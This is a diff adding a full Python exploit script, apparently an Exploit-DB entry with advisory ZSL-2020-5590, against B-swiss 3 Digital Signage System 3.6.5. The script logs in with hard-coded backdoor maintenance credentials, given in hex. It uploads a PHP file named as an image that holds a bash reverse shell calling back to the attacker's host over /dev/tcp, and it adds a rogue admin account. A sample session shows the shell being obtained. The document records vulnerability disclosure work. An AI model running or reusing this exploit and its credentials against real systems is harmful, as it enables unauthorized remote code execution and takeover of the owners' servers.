@@ -1,0 +1,346 @@
+# Exploit Title: B-swiss 3 Digital Signage System 3.6.5 - Remote Code Execution
+# Date: 2020-08-27
+# Exploit Author: LiquidWorm
+# Vendor Homepage: https://www.b-swiss.com
+# Version: <= 3.6.5
+# CVE : N/A
+
+
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+#
+#
+# B-swiss 3 Digital Signage System 3.6.5 Backdoor Remote Code Execution
+#
+#
+# Vendor: B-Swiss SARL | b-tween Sarl
+# Product web page: https://www.b-swiss.com
+# Affected version: 3.6.5
+#                   3.6.2
+#                   3.6.1
+#                   3.6.0
+#                   3.5.80
+#                   3.5.40
+#                   3.5.20
+#                   3.5.00
+#                   3.2.00
+#                   3.1.00
+#
+# Summary: Intelligent digital signage made easy. To go beyond the
+# possibilities offered, b-swiss allows you to create the communication
+# solution for your specific needs and your graphic charter. You benefit
+# from our experience and know-how in the realization of your digital
+# signage project.
+#
+# Desc: The application suffers from an "authenticated" arbitrary
+# PHP code execution. The vulnerability is caused due to the improper
+# verification of uploaded files in 'index.php' script thru the 'rec_poza'
+# POST parameter. This can be exploited to execute arbitrary PHP code
+# by uploading a malicious PHP script file that will be stored in
+# '/usr/users' directory. Due to an undocumented and hidden "maintenance"
+# account 'admin_m' which has the highest privileges in the application,
+# an attacker can use these hard-coded credentials to authenticate and
+# use the vulnerable image upload functionality to execute code on the
+# server.
+#
+# ========================================================================================
+# lqwrm@metalgear:~/prive$ python3 sign2.py 192.168.10.11 192.168.10.22 7777
+# [*] Checking target...
+# [*] Good to go!
+# [*] Checking for previous attempts...
+# [*] All good.
+# [*] Getting backdoor session...
+# [*] Got master backdoor cookie: 0c1617103c6f50107d09cb94b3eafeb2
+# [*] Starting callback listener child thread
+# [*] Starting handler on port 7777
+# [*] Adding GUI credentials: test:123456
+# [*] Executing and deleting stager file
+# [*] Connection from 192.168.10.11:40080
+# [*] You got shell!
+# id ; uname -or
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+# 4.15.0-20-generic GNU/Linux
+# exit
+# *** Connection closed by remote host ***
+# [?] Want me to remove the GUI credentials? y
+# [*] Removing...
+# [*] t00t!
+# lqwrm@metalgear:~/prive$ 
+# ========================================================================================
+#
+# Tested on: Linux 5.3.0-46-generic x86_64
+#            Linux 4.15.0-20-generic x86_64
+#            Linux 4.9.78-xxxx-std-ipv6-64
+#            Linux 4.7.0-040700-generic x86_64
+#            Linux 4.2.0-27-generic x86_64
+#            Linux 3.19.0-47-generic x86_64
+#            Linux 2.6.32-5-amd64 x86_64
+#            Darwin 17.6.0 root:xnu-4570.61.1~1 x86_64
+#            macOS 10.13.5
+#            Microsoft Windows 7 Business Edition SP1 i586
+#            Apache/2.4.29 (Ubuntu)
+#            Apache/2.4.18 (Ubuntu)
+#            Apache/2.4.7 (Ubuntu)
+#            Apache/2.2.22 (Win64)
+#            Apache/2.4.18 (Ubuntu)
+#            Apache/2.2.16 (Debian)
+#            PHP/7.2.24-0ubuntu0.18.04.6
+#            PHP/5.6.40-26+ubuntu18.04.1+deb.sury.org+1
+#            PHP/5.6.33-1+ubuntu16.04.1+deb.sury.org+1
+#            PHP/5.6.31
+#            PHP/5.6.30-10+deb.sury.org~xenial+2
+#            PHP/5.5.9-1ubuntu4.17
+#            PHP/5.5.9-1ubuntu4.14
+#            PHP/5.3.10
+#            PHP/5.3.13
+#            PHP/5.3.3-7+squeeze16
+#            PHP/5.3.3-7+squeeze17
+#            MySQL/5.5.49
+#            MySQL/5.5.47
+#            MySQL/5.5.40
+#            MySQL/5.5.30
+#            MySQL/5.1.66
+#            MySQL/5.1.49
+#            MySQL/5.0.77
+#            MySQL/5.0.12-dev
+#            MySQL/5.0.11-dev
+#            MySQL/5.0.8-dev
+#            phpMyAdmin/3.5.7
+#            phpMyAdmin/3.4.10.1deb1
+#            phpMyAdmin/3.4.7
+#            phpMyAdmin/3.3.7deb7
+#            WampServer 3.2.0
+#            Acore Framework 2.0
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+# Macedonian Information Security Research and Development Laboratory
+# Zero Science Lab - https://www.zeroscience.mk - @zeroscience
+#
+#
+# Advisory ID: ZSL-2020-5590
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5590.php
+#
+#
+# 13.06.2020
+#
+
+from http.cookiejar import DefaultCookiePolicy# #yciloPeikooCtluafeD tropmi rajeikooc.ptth mofr
+from http.cookiejar import CookieJar#         oOo         #raJeikooC tropmi rajeikooc.ptth mofr
+from six.moves import input# #-----------------+-----------------# #tupni trompi sevom.xis morf
+from time import sleep#      |              01 | 04              |      #peels trompi emit morf
+import urllib.request#       |                 |              |  |       #tseuqer.billru tropmi
+import urllib.parse#         |                 |              |  |         #esrap.billru tropmi
+import telnetlib#            |                 |                 |            #biltenlet tropmi
+import threading#            |  |              |                 |            #gnidaerht tropmi
+import requests#             |  |              |                 |             #stseuqer tropmi
+import socket#               |                 |    o            |               #tekcos tropmi
+import sys,re#               |                 |                 |               #er,sys tropmi
+##############               #-----------------+-----------------#               ##############
+###############                               oOo                               ###############
+################                               |                               ################
+####################                           Y                           ####################
+############################                   _                   ############################
+###############################################################################################
+
+class Sign:
+    
+    def __init__(self):
+        self.username = b"\x61\x64\x6d\x69\x6e\x5f\x6d"
+        self.altruser = b"\x62\x2d\x73\x77\x69\x73\x73"
+        self.password = b"\x44\x50\x36\x25\x57\x33\x64"
+        self.agent = "SignageBot/1.02"
+        self.fileid = "251"
+        self.payload = None
+        self.answer = False
+        self.params = None
+        self.rhost = None
+        self.lhost = None
+        self.lport = None
+        self.send = None
+
+    def env(self):
+        if len(sys.argv) != 4:
+            self.usage()
+        else:
+            self.rhost = sys.argv[1]
+            self.lhost = sys.argv[2]
+            self.lport = int(sys.argv[3])
+            if not "http" in self.rhost:
+                self.rhost = "http://{}".format(self.rhost)
+
+    def usage(self):
+        self.roger()
+        print("Usage: python3 {} <RHOST[:RPORT]> <LHOST> <LPORT>".format(sys.argv[0]))
+        print("Example: python3 {} 192.168.10.11:80 192.168.10.22 7777\n".format(sys.argv[0]))
+        exit(0)
+
+    def roger(self):
+        waddup = """
+       ____________________
+      /                    \\
+      !      B-swiss 3     !
+      !         RCE        !
+      \____________________/
+               !  !
+               !  !
+               L_ !
+              / _)!
+             / /__L
+____________/ (____)
+              (____)
+____________  (____)
+            \_(____)
+               !  !
+               !  !
+               \__/  
+        """
+        print(waddup)
+
+    def test(self):
+        print("[*] Checking target...")
+        try:
+            r = requests.get(self.rhost)
+            response = r.text
+            if not "B-swiss" in response:
+                print("[!] Not a b-swiss system")
+                exit(0)
+            if "B-swiss" in response:
+                print("[*] Good to go!")
+                next
+            else:
+                exit(-251)
+        except Exception as e:
+            print("[!] Ney ney: {msg}".format(msg=e))
+            exit(-1)
+
+    def login(self):
+        token = ""
+        cj = CookieJar()
+        self.params = {"locator"  : "visitor.ProcessLogin",
+                       "username" : self.username,
+                       "password" : self.password,
+                       "x"        : "0",
+                       "y"        : "0"}
+
+        damato = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
+        damato.addheaders.pop()
+        damato.addheaders.append(("User-Agent", self.agent))
+        
+        try:
+            print("[*] Getting backdoor session...")
+            damato.open(self.rhost + "/index.php", urllib.parse.urlencode(self.params).encode('utf-8'))
+            for cookie in cj:
+                token = cookie.value
+                print("[*] Got master backdoor cookie: "+token)
+        except urllib.request.URLError as e:
+            print("[!] Connection error: {}".format(e.reason))
+
+        return token
+
+    def upload(self):
+        j = "\r\n"
+        self.cookies = {"PNU_RAD_LIB"     : self.rtoken}
+        self.headers = {"Cache-Control"   : "max-age=0",
+                        "Content-Type"    : "multipart/form-data; boundary=----j",
+                        "User-Agent"      : self.agent,
+                        "Accept-Encoding" : "gzip, deflate",
+                        "Accept-Language" : "en-US,en;q=0.9",
+                        "Connection"      : "close"}
+    
+        self.payload = "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/"+self.lhost+"/"+str(self.lport)+" <&1;rm "+self.fileid+".php'\");"
+
+        print("[*] Adding GUI credentials: test:123456")
+        # rec_adminlevel values:
+        # ----------------------
+        # 100000 - "b-swiss Maintenance Admin" (Undocumented privilege)
+        #      7 - "B-swiss admin" <---------------------------------------------------------------------------------------+
+        #      8 - Other                                                                                                   |
+        #                                                                                                                  |
+        self.send  = "------j{}Content-Disposition: form-data; ".format(j)#                                                |
+        self.send += "name=\"locator\"{}Users.Save{}------j{}Content-Disposition: form-data; ".format(j*2,j,j)#            |
+        self.send += "name=\"page\"{}------j{}Content-Disposition: form-data; ".format(j*3,j)#                             |
+        self.send += "name=\"sort\"{}------j{}Content-Disposition: form-data; ".format(j*3,j)#                             |
+        self.send += "name=\"id\"{}{}{}------j\r\nContent-Disposition: form-data; ".format(j*2,self.fileid,j,j)#           |
+        self.send += "name=\"ischildgrid\"{}------j{}Content-Disposition: form-data; ".format(j*3,j)#                      |
+        self.send += "name=\"inpopup\"{}------j{}Content-Disposition: form-data; ".format(j*3,j)#                          |
+        self.send += "name=\"ongridpage\"{}------j{}Content-Disposition: form-data; ".format(j*3,j)#                       |
+        self.send += "name=\"rowid\"{}------j{}Content-Disposition: form-data; ".format(j*3,j)#                            |
+        self.send += "name=\"preview_screenid\"{}------j{}Content-Disposition: form-data; ".format(j*3,j)#                 |
+        self.send += "name=\"rec_firstname\"{}TestF{}------j{}Content-Disposition: form-data; ".format(j*2,j,j)#           |
+        self.send += "name=\"rec_lastname\"{}TestL{}------j{}Content-Disposition: form-data; ".format(j*2,j,2)#            |
+        self.send += "name=\"rec_email\"{}test@test.cc{}------j{}Content-Disposition: form-data; ".format(j*2,j,j)#        |
+        self.send += "name=\"rec_username\"{}test{}------j{}Content-Disposition: form-data; ".format(j*2,j,j)#             |
+        self.send += "name=\"rec_password\"{}123456{}------j{}Content-Disposition: form-data; ".format(j*2,j,j)#           |
+        self.send += "name=\"rec_cpassword\"{}123456{}------j{}Content-Disposition: form-data; ".format(j*2,j,j)#          |
+        self.send += "name=\"rec_adminlevel\"{}7{}------j{}Content-Disposition: form-data; ".format(j*2,j,j)#   <----------+
+        self.send += "name=\"rec_status\"{}1{}------j{}Content-Disposition: form-data; ".format(j*2,j,j)
+        self.send += "name=\"rec_poza\"; filename=\"Blank.jpg.php\"{}Content-Type: application/octet-stream{}".format(j,j*2)
+        self.send += self.payload+"{}------j{}Content-Disposition: form-data; ".format(j,j)
+        self.send += "name=\"rec_poza_face\"{}C:\\fakepath\\Blank.jpg{}------j{}Content-Disposition: form-data; ".format(j*2,j,j)
+        self.send += "name=\"rec_language\"{}french-sw{}------j{}Content-Disposition: form-data; ".format(j*2,j,j)
+        self.send += "name=\"rec_languages[]\"{}2{}------j{}Content-Disposition: form-data; ".format(j*2,j,j)
+        self.send += "name=\"rec_can_change_password\"{}1{}------j--{}".format(j*2,j,j)
+    
+        requests.post(self.rhost+"/index.php", headers=self.headers, cookies=self.cookies, data=self.send)
+        print("[*] Executing and deleting stager file")
+        r = requests.get(self.rhost+"/usr/users/"+self.fileid+".php")
+        sleep(1)
+
+        self.answer = input("[?] Want me to remove the GUI credentials? ").strip()
+        if self.answer[0] == "y" or self.answer[0] == "Y":
+            print("[*] Removing...")
+            requests.get(self.rhost+"/index.php?locator=Users.Delete&id="+self.fileid, headers=self.headers, cookies=self.cookies)
+        if self.answer[0] == "n" or self.answer[0] == "N":
+            print("[*] Cool!")
+        print("[*] t00t!")
+        exit(-1)
+
+    def razmisluju(self):
+        print("[*] Starting callback listener child thread")
+        konac = threading.Thread(name="ZSL", target=self.phone)
+        konac.start()
+        sleep(1)
+        self.upload()
+
+    def fish(self):
+        r = requests.get(self.rhost+"/usr/users/", verify=False, allow_redirects=False)
+        response = r.text
+        print("[*] Checking for previous attempts...")
+        if not ".php" in response:
+            print("[*] All good.")
+        elif "251.php" in response:
+            print("[!] Stager file \"{}.php\" still present on the server".format(self.fileid))
+
+    def phone(self):
+        telnetus = telnetlib.Telnet()
+        print("[*] Starting handler on port {}".format(self.lport))
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind(("0.0.0.0", self.lport))
+        while True:
+            try:
+                s.settimeout(7)
+                s.listen(1)
+                conn, addr = s.accept()
+                print("[*] Connection from {}:{}".format(addr[0], addr[1]))
+                telnetus.sock = conn
+            except socket.timeout as p:
+                print("[!] No outgoing calls :( ({msg})".format(msg=p))
+                print("[+] Check your port mappings or increase timeout")
+                s.close()
+                exit(0)
+            break
+
+        print("[*] You got shell!")
+        telnetus.interact()
+        conn.close()
+
+    def main(self):
+        self.env()
+        self.test()
+        self.fish()
+        self.rtoken = self.login()
+        self.razmisluju()
+
+if __name__ == '__main__':
+    Sign().main()
